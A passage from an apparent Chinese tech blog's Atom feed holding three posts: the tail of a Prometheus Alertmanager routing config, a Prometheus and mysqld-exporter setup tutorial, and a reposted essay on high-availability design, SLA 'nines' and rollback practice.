class="line">  group_wait: 30s</div><div class="line"></div><div class="line">  # When the first notification was sent, wait &apos;group_interval&apos; to send a batch</div><div class="line">  # of new alerts that started firing for that group.</div><div class="line">  group_interval: 5m</div><div class="line"></div><div class="line">  # If an alert has successfully been sent, wait &apos;repeat_interval&apos; to</div><div class="line">  # resend them.</div><div class="line">  repeat_interval: 3h</div><div class="line"></div><div class="line">  # All the above attributes are inherited by all child routes and can </div><div class="line">  # overwritten on each.</div><div class="line"></div><div class="line">  # The child route trees.</div><div class="line">  routes:</div><div class="line">  # This routes performs a regular expression match on alert labels to</div><div class="line">  # catch alerts that are related to a list of services.</div><div class="line">  - match_re:</div><div class="line">      service: ^(foo1|foo2|baz)$</div><div class="line">    receiver: team-X-mails</div><div class="line"></div><div class="line">    # The service has a sub-route for critical alerts, any alerts</div><div class="line">    # that do not match, i.e. severity != critical, fall-back to the</div><div class="line">    # parent node and are sent to &apos;team-X-mails&apos;</div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">  - match:</div><div class="line">      service: files</div><div class="line">    receiver: team-Y-mails</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        severity: critical</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line">  # This route handles all alerts coming from a database service. If there&apos;s</div><div class="line">  # no team to handle it, it defaults to the DB team.</div><div class="line">  - match:</div><div class="line">      service: database</div><div class="line"></div><div class="line">    receiver: team-DB-pager</div><div class="line">    # Also group alerts by affected database.</div><div class="line">    group_by: [alertname, cluster, database]</div><div class="line"></div><div class="line">    routes:</div><div class="line">    - match:</div><div class="line">        owner: team-X</div><div class="line">      receiver: team-X-pager</div><div class="line"></div><div class="line">    - match:</div><div class="line">        owner: team-Y</div><div class="line">      receiver: team-Y-pager</div><div class="line"></div><div class="line"></div><div class="line"># Inhibition rules allow to mute a set of alerts given that another alert is</div><div class="line"># firing.</div><div class="line"># We use this to mute any warning-level notifications if the same alert is</div><div class="line"># already critical.</div><div class="line">inhibit_rules:</div><div class="line">- source_match:</div><div class="line">    severity: &apos;critical&apos;</div><div class="line">  target_match:</div><div class="line">    severity: &apos;warning&apos;</div><div class="line">  # Apply inhibition if the alertname is the same.</div><div class="line">  equal: [&apos;alertname&apos;]</div><div class="line"></div><div class="line"></div><div class="line">receivers:</div><div class="line">- name: &apos;team-X-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-X-pager&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-X+alerts-critical@example.org&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-X-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-Y-mails&apos;</div><div class="line">  email_configs:</div><div class="line">  - to: &apos;team-Y+alerts@example.org&apos;</div><div class="line"></div><div class="line">- name: &apos;team-Y-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-Y-key&gt;</div><div class="line"></div><div class="line">- name: &apos;team-DB-pager&apos;</div><div class="line">  pagerduty_configs:</div><div class="line">  - service_key: &lt;team-DB-key&gt;</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/prometheus/alertmanager" target="_blank" rel="external">prometheus/alertmanager</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      The Alertmanager handles alerts sent by client applications such as the Prometheus server
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>监控工具之Prometheus</title>
    <link href="https://t1ger.github.io/2016/11/16/%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E4%B9%8BPrometheus/"/>
    <id>https://t1ger.github.io/2016/11/16/监控工具之Prometheus/</id>
    <published>2016-11-16T09:23:56.000Z</published>
    <updated>2016-11-16T15:44:20.262Z</updated>
    
    <content type="html"><![CDATA[<p>Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现<br>，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不依赖分布式存储，支持图表和dashboard等多种方式,适用于监控所有时间序列的项目。</p>
<p>下图是Prometheus和它的组件的整体架构：<br><img src="https://camo.githubusercontent.com/df3e3daf7d6809ba82986eb33664a4283314f7a9/68747470733a2f2f63646e2e7261776769742e636f6d2f70726f6d6574686575732f70726f6d6574686575732f653736316630642f646f63756d656e746174696f6e2f696d616765732f6172636869746563747572652e737667" alt="Prometheus架构"></p>
<p>Prometheus通过直接或者短时jobs中介网关收集监控数据，在本地存储所有收集到的数据，并且通过定义好的rules产生新的时间序列数据，或者发送警报。Promdash或者其他使用API的clients可以将采集到的数据可视化。</p>
<p>快速安装配置教程：<br>Prometheus可通过二进制安装或者docker安装，这里我们使用二进制安装<br><a href="https://prometheus.io/download" target="_blank" rel="external">下载最新版本</a> ，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xvfz prometheus-*.tar.gz</div><div class="line">cd prometheus-*</div><div class="line">./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>在 <a href="http://localhost:9090" target="_blank" rel="external">http://localhost:9090</a> 可以看到状态页。你也可以通过 <a href="http://localhost:9090/metrics" target="_blank" rel="external">http://localhost:9090/metrics</a> 查看监控项<br>这里我们以监控mysql为例来说下部署流程<br>修改prometheus.yml，在文件最后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- job_name: &apos;mysql&apos;</div><div class="line">    # Override the global default and scrape targets from this job every 5 seconds.</div><div class="line">    scrape_interval: 5s</div><div class="line">    # metrics_path defaults to &apos;/metrics&apos;</div><div class="line">    # scheme defaults to &apos;http&apos;.</div><div class="line">    static_configs:</div><div class="line">      - targets: [&apos;localhost:9104&apos;]</div><div class="line">        labels:</div><div class="line">          instance: db1</div></pre></td></tr></table></figure>
<p>重启prometheus服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./prometheus -config.file=prometheus.yml</div></pre></td></tr></table></figure></p>
<p>再打开localhost:9090，查看Status -&gt;Targets页面下，就可以看到配置的两个target：一个是prometheus本身，State为UP，另一个是mysql，State为DOWN，因为我们还没有配置监控mysql的服务。</p>
<p>安装mysql exporter<br>这里可以直接使用docker或者下载二进制包解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>mysql exporter 需要连接mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CREATE USER &apos;mysqlexporter&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;mysqlexporter&apos;;</div><div class="line">GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO &apos;mysqlexporter&apos;@&apos;localhost&apos;</div></pre></td></tr></table></figure></p>
<p>如果使用docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker run -d \          </div><div class="line">-p 9104:9104 \        </div><div class="line">-e DATA_SOURCE_NAME=&quot;mysqlexporter:mysqlexporter@(localhost:3306)/data_store&quot; prom/mysqld-exporter</div></pre></td></tr></table></figure></p>
<p>如果使用二进制包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tar zxf mysqld_exporter-* -C /usr/local/prometheus_exporters</div><div class="line">cd /usr/local/prometheus_exporters</div><div class="line">$ cat &lt;&lt; EOF &gt; .my.cnf</div><div class="line">[client]</div><div class="line">user=mysqlexporter</div><div class="line">password=mysqlexporter</div><div class="line">EOF</div><div class="line">$ ./mysqld_exporter -config.my-cnf=&quot;.my.cnf&quot;</div></pre></td></tr></table></figure></p>
<p>我们再次回到Status-&gt;Targets页面，可以看到两个Target的状态已经变成UP了</p>
<p>ref</p>
<p><a href="https://prometheus.io/" target="_blank" rel="external">prometheus.io</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Prometheus是一个开源的系统监控和报警的工具包，最初由SoundCloud发布,大多数组件是用go完成的。Prometheus 监控数据通过服务或静态配置来发现&lt;br&gt;，通过pull方式采集时间序列，通过http协议传输，支持通过中介网关的push时间序列的方式，不
    
    </summary>
    
    
      <category term="linux" scheme="https://t1ger.github.io/tags/linux/"/>
    
      <category term="google" scheme="https://t1ger.github.io/tags/google/"/>
    
      <category term="Prometheus" scheme="https://t1ger.github.io/tags/Prometheus/"/>
    
  </entry>
  
  <entry>
    <title>关于高可用的系统一点思考</title>
    <link href="https://t1ger.github.io/2016/11/11/%E5%85%B3%E4%BA%8E%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
    <id>https://t1ger.github.io/2016/11/11/关于高可用的系统一点思考/</id>
    <published>2016-11-11T09:42:34.000Z</published>
    <updated>2016-11-13T13:40:28.626Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="理解高可用系统"><a href="#理解高可用系统" class="headerlink" title="理解高可用系统"></a><b>理解高可用系统</b></h4><p>高可用，顾名思义就是要我们的计算环境(包括软硬件)做到full-time的可用性。通常在需要做好如下设计：</p>
<ul>
<li>对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby</li>
<li>对故障的检测和恢复。检测故障以及用备份的节点接管故障点。就是我们常说的failover</li>
<li>需要很可靠的交汇点(CrossOver)。eg. 域名解析、负载均衡等</li>
</ul>
<p>说起来很简单，然而，细节决定成败，冗余节点最大的难题就是有状态的节点数据复制和数据一致性的保证(无状态节点冗余相对简单)：</p>
<ul>
<li>如果系统的数据镜像到冗余节点是异步的，那么failover的时候就会出现数据差异</li>
<li>如果系统在数据镜像到冗余节点是同步的，那么会导致冗余节点越多性能越慢。</li>
</ul>
<p>所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了。</p>
<p>下面，总结一下高可用的设计原理：</p>
<ul>
<li>要做到数据不丢，就必须持久化</li>
<li>要做到服务高可用，必须有备用，无论是应用结点还是数据结点</li>
<li>要做到复制，就会有数据一致性的问题</li>
<li>我们不可能做到100%的高可用，即我们能做到几个9的SLA</li>
</ul>
<h4 id="高可用技术方案的示例"><a href="#高可用技术方案的示例" class="headerlink" title="高可用技术方案的示例"></a><b>高可用技术方案的示例</b></h4><p>简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）</p>
<ul>
<li>Mysql Repleaction(一般配合keepalived 实现failover) 是传统的异步数据同步或是半同步Semi-Sync(只要有一个slave收到更新就返回成功）这个方式本质上不到2个9)</li>
<li>MMM/MHA通过MySQL replication技术可以实现两个服务器互为主从，且在任何时候只有一个节点可以被写入，避免了多点写入的数据冲突。同时，当可写的主节点故障时，MMM/MHA套件可以立刻监控到，然后将服务自动切换到另一个主节点，继续提供服务，从而实现MySQL的高可用。这个方案的可用性可以达到99%。备注：MMM项目已于2012停止更新</li>
<li>DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9</li>
<li>Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9</li>
<li>MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9</li>
</ul>
<p>那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。</p>
<h4 id="高可用性SLA的定义"><a href="#高可用性SLA的定义" class="headerlink" title="高可用性SLA的定义"></a><b>高可用性SLA的定义</b></h4><p>重点来了，工业界有两种方法来测量SLA</p>
<ul>
<li>一个是故障发生到恢复的时间</li>
<li>另一个是两次故障间的时间</li>
</ul>
<p>通常我们采用前者，即故障发生到恢复的时间，也就是服务不可用时间</p>
<table>
<thead>
<tr>
<th style="text-align:left">系统可用性</th>
<th style="text-align:left">宕机时间/年</th>
<th style="text-align:left">宕机时间/月</th>
<th style="text-align:left">宕机时间/周</th>
<th style="text-align:left">宕机时间/天</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">90% (1个9)</td>
<td style="text-align:left">36.5 天</td>
<td style="text-align:left">72 小时</td>
<td style="text-align:left">16.8 小时</td>
<td style="text-align:left">2.4 小时</td>
</tr>
<tr>
<td style="text-align:left">99% (2个9)</td>
<td style="text-align:left">3.65 天</td>
<td style="text-align:left">7.20 小时</td>
<td style="text-align:left">1.68 小时</td>
<td style="text-align:left">14.4 分</td>
</tr>
<tr>
<td style="text-align:left">99.9% (3个9)</td>
<td style="text-align:left">8.76 小时</td>
<td style="text-align:left">43.8 分</td>
<td style="text-align:left">10.1 分钟</td>
<td style="text-align:left">1.44 分</td>
</tr>
<tr>
<td style="text-align:left">99.99% (4个9)</td>
<td style="text-align:left">52.56 分</td>
<td style="text-align:left">4.38 分</td>
<td style="text-align:left">1.01 分钟</td>
<td style="text-align:left">8.66 秒</td>
</tr>
<tr>
<td style="text-align:left">99.999% (5个9)</td>
<td style="text-align:left">5.26 分</td>
<td style="text-align:left">25.9 秒</td>
<td style="text-align:left">6.05 秒</td>
<td style="text-align:left">0.87 秒</td>
</tr>
</tbody>
</table>
<p>比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。<br>到 3 个 9 可以靠堆人，也就是 3 班倒之类的强制值班基本搞定。但是从 3 个 9 往上，就基本超出了人力的范畴，考验的是业务的自愈能力，架构的容灾、容错设计，灾备系统的完善等等。<br>据说Google 内部只有 4 个 9 以上的服务才会配备 SRE，SRE 是必须在接到报警 5 分钟之内上线处理问题的，否则报警系统自动升级到下一个 SRE。如果还没有，直接给老板发报警。</p>
<p>简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。</p>
<p>无计划的</p>
<ul>
<li>系统级故障-包括主机、操作系统、中间件、数据库、网络、电源以及外围设备</li>
<li>数据和中介的故障-包括人员误操作、硬盘故障、数据乱了</li>
<li>外部因素-自然灾害、人为破坏、以及供电问题</li>
</ul>
<p>有计划的</p>
<ul>
<li>日常任务-备份、容量规划、用户和安全管理，后台批处理应用</li>
<li>运维相关-数据库维护、应用维护、中间件维护、操作系统维护、网络维护</li>
<li>升级相关-数据库、应用、中间件、操作系统、网络、包括硬件升级</li>
</ul>
<p>有计划的维护因素主要来自于变更管理，避免措施主要有以下几个方面：</p>
<ul>
<li>线下测试（Offline Test）</li>
<li>灰度发布</li>
<li>服务必须对回滚提供支持</li>
</ul>
<p>针对回滚，跟大家分享一下，保证药到病除：</p>
<p>理由1：我这个数据改动之后格式跟以前的不兼容了，回退也不能正常！<br>秘籍1：设计、开发时候就考虑好兼容性问题！！！比如说数据库改字段的事就不要做，改成另加一个字段就好。数据存储格式就最好采用 protobuf 这种支持数据版本、支持前后兼容性的方案。最差的情况，也要在变更实施『之前』，想清楚数据兼容性的问题。没有回滚脚本，不给更新，起码做到有备而战。</p>
<p>理由2：我这个变更删掉东西了！回退之后数据也没了！<br>秘籍2：你一定是在逗我。把这个变更打回去，分成两半。第一半禁止访问这个数据。等到发布之后真没问题了，再来发布第二半，第二半真正删掉数据。这样第一半实施之后需要回滚还可以再回去。</p>
<p>理由3：我这个变更发布了之后, 其他依赖这个系统的人都拿到了错误的数据，再回退也没用了，他们不会再接受老数据了！<br>秘籍3：这种比较常见出现在配置管理、缓存等系统中。对这类问题，最重要的就是，应该开发一种跟版本无关的刷新机制。触发刷新的机制应该独立于发布过程。 要有一个强制刷新数据的手段。</p>
<p>以上三个秘籍覆盖了100%的回滚兼容性问题，如果有不存在的，请务必告诉我！</p>
<h4 id="决定高可用的本质原因"><a href="#决定高可用的本质原因" class="headerlink" title="决定高可用的本质原因"></a><b>决定高可用的本质原因</b></h4><p><b>通过上述影响SLA的因素，我们可以看出实现5个9意味着一年的时间只能有5分钟不可用，如果没有一支技术牛逼的团队加上一套自动化的工具，怎么能有高可用系统呢</b></p>
<p>要实现高可用系统，其中包括但不限于：</p>
<ul>
<li>软件的设计、编码、测试、上线和软件配置的水平</li>
<li>工程师的技术水平</li>
<li>运维的管理和技术水平</li>
<li>数据中心的运营管理水平</li>
<li>依赖于第三方服务的管理水平</li>
</ul>
<p>ref<br><a href="http://coolshell.cn/articles/17459.htm" target="_blank" rel="external">关于高可用的系统</a><br><a href="https://blog.coding.net/blog/architecture-concept-and-practice-from-Google" target="_blank" rel="external">来自 Google 的高可用架构理念与实践</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      think about High Availability
    
    </summary>
    
    
  </entry>
  
</feed>
